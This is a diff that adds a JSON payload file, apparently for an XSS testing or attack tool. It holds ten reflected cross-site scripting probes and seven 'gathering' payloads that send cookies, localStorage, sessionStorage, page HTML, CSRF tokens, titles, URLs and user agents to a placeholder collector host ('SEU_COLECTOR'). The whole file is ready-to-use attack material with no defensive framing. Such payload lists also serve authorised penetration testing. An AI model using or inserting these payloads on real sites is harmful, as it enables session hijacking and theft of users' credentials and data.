@@ -1,0 +1,23 @@
+{
+  "reflected": [
+    "<script>alert('XSS')</script>",
+    "\"><script>alert(1)</script>",
+    "'><script>alert(1)</script>",
+    "\"><img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "\"><svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "javascript:alert(1)",
+    "<details open ontoggle=alert(1)>"
+  ],
+  "gathering": {
+    "cookie_steal": "<script>fetch('http://SEU_COLECTOR/?c='+encodeURIComponent(document.cookie))</script>",
+    "localstorage": "<script>fetch('http://SEU_COLECTOR/?s='+btoa(JSON.stringify(localStorage)))</script>",
+    "sessionstorage": "<script>fetch('http://SEU_COLECTOR/?ss='+btoa(JSON.stringify(sessionStorage)))</script>",
+    "dom_dump": "<script>fetch('http://SEU_COLECTOR/?d='+btoa(unescape(encodeURIComponent(document.body.innerHTML))))</script>",
+    "csrf_harvest": "<script>var t=document.querySelector('[name=csrf_token],[name=_token],[name=__RequestVerificationToken]');if(t)fetch('http://SEU_COLECTOR/?t='+encodeURIComponent(t.value))</script>",
+    "page_title": "<script>fetch('http://SEU_COLECTOR/?title='+encodeURIComponent(document.title)+'&url='+encodeURIComponent(location.href))</script>",
+    "user_agent": "<script>fetch('http://SEU_COLECTOR/?ua='+encodeURIComponent(navigator.userAgent))</script>"
+  }
+}
